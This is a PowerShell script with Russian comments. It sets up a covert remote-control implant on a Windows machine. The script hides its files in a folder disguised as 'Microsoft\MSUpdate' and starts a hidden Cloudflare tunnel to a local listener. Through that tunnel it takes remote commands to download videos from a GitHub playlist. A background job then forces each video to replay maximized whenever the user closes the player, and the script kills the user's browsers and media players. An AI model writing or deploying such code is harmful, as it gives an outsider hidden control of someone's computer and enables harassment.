# КОНФИГ
$github = "NodeNode30-30"
$repo = "system-libs"
$branch = "main"
$playlist = "playlist.txt"

# Рабочая директория в AppData пользователя (скрыта по умолчанию, админка не нужна)
$workDir = "$env:USERPROFILE\AppData\Local\Microsoft\MSUpdate"
$cfPath = "$workDir\cloudflared.exe"
$listenerPort = 1337
$playedFile = "$workDir\played.txt"
$flagFile = "$workDir\play.flag"

# Создаём рабочую папку, если её ещё нет
if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }

# Функция загрузки файлов с GitHub
function Get-GitHubFile($path) {
    $url = "https://raw.githubusercontent.com/$github/$repo/$branch/$path"
    return (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
}

# Скачиваем cloudflared, если его нет в папке
if (-not (Test-Path $cfPath)) {
    $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing
}

# Запускаем туннель Cloudflare в скрытом режиме
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $cfPath
$psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile $workDir\tunnel.log"
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Поднимаем локальный HTTP-сервер
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$listenerPort/")
$listener.Start()

# Функция отправки HTTP-ответов
function Send-Response($ctx, $msg) {
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($msg)
    $ctx.Response.ContentLength64 = $buffer.Length
    $ctx.Response.OutputStream.Write($buffer, 0, $buffer.Length)
    $ctx.Response.Close()
}

# Функция чистки процессов и сброса флагов
function Stop-All {
    if (Test-Path $flagFile) { [System.IO.File]::WriteAllText($flagFile, "0") }
    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Remove-Job -Force
    Get-Process -Name "Video.UI","wmplayer","mpv","vlc","msedge","chrome","firefox" -ErrorAction SilentlyContinue | Stop-Process -Force
    if (Test-Path "$workDir\video.mp4") { Remove-Item "$workDir\video.mp4" -Force -ErrorAction SilentlyContinue }
}

# Основной цикл обработки входящих команд
while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    $path = $ctx.Request.Url.AbsolutePath

    switch ($path) {
        "/play" {
            try {
                # Перед запуском нового трека полностью очищаем старые процессы
                Stop-All
                Start-Sleep -Seconds 1

                $content = Get-GitHubFile $playlist
                $urls = $content -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
                $played = @()
                if (Test-Path $playedFile) { $played = Get-Content $playedFile }
                
                # Ищем первое несыгранное видео
                $next = $urls | Where-Object { $_ -notin $played } | Select-Object -First 1
                if ($next) {
                    $outFile = "$workDir\video.mp4"
                    Invoke-WebRequest -Uri $next -OutFile $outFile -UseBasicParsing
                    
                    # Ставим флаг активности в "1"
                    [System.IO.File]::WriteAllText($flagFile, "1")
                    
                    # Запускаем фоновый поток контроля окна плеера
                    Start-Job -Name "VideoEnforcer" -ScriptBlock {
                        param($file, $flag)
                        while ((Test-Path $flag) -and ([System.IO.File]::ReadAllText($flag) -eq "1")) {
                            if (-not (Get-Process -Name "Video.UI","wmplayer","mpv","vlc" -ErrorAction SilentlyContinue)) {
                                Start-Process -FilePath $file -WindowStyle Maximized
                                Start-Sleep -Seconds 2
                            }
                            Start-Sleep -Seconds 1
                        }
                    } -ArgumentList $outFile, $flagFile | Out-Null
                    
                    Add-Content $playedFile $next
                    Send-Response $ctx "Playing and locked: $next"
                } else {
                    Send-Response $ctx "All videos played"
                }
            } catch {
                Send-Response $ctx "Error: $_"
            }
        }
        "/next" {
            Stop-All
            $ctx.Response.Redirect("/play")
            $ctx.Response.Close()
        }
        "/stop" {
            Stop-All
            Send-Response $ctx "Stopped"
        }
        "/tunnel" {
            if (Test-Path "$workDir\tunnel.log") {
                $url = (Select-String -Path "$workDir\tunnel.log" -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1).Matches.Value
                Send-Response $ctx ($url -or "Tunnel logging started but URL not found yet")
            } else {
                Send-Response $ctx "Log file not found"
            }
        }
        "/exit" {
            Stop-All
            Send-Response $ctx "Bye"
            [System.Environment]::Exit(0)
        }
        default {
            Send-Response $ctx "Commands: /play, /next, /stop, /tunnel, /exit"
        }
    }
}

